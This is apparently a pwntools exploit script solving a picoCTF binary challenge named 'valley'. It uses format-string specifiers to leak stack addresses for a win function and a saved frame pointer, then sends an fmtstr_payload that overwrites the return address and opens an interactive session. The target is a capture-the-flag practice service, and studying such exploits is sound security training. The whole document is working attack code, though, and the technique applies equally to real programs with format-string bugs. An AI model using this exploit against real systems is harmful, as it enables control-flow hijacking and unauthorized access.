from pwn import *

context(arch='amd64',terminal=['tmux','new-window'])

host, port = 'shape-facility.picoctf.net',50890
local = True

fname = './valley'

e = ELF(fname)
r = process(['/glibc/2.34/64/lib/ld-linux-x86-64.so.2',fname], env={'LD_PRELOAD': '/glibc/2.34/64/lib/libc.so.6'}) if local else remote(host, port)


def leak_win_func():
	print('send {}'.format(hex(e.plt['printf'])))
	r.sendline(b'%21$lx')
	addr = int(r.recvline().decode().split(':')[1].strip(),16)
	return addr-392-34

def overwrite_addr(addr,content):
	payload = fmtstr_payload(6, {addr: content}, write_size='short')
	r.sendline(payload)	

def leak_ebp_addr():
	r.sendline(b'%20$lx')
	addr =  int(r.recvline().decode().split(':')[1].strip(),16)
	return addr


if __name__ == '__main__':
	print(r.recvline())
	
	win = leak_win_func()
	print('@win = {}'.format(hex(win)))

	ebp_addr = leak_ebp_addr()
	print('@ebp_addr = {}'.format(hex(ebp_addr)))
	if local:
		gdb.attach(r, '''
			b *{}
			'''.format(hex(win))
		)
	
	overwrite_addr(ebp_addr-0x8,win) # overwrite RA	
	r.sendline('exit')
	r.interactive()	
	
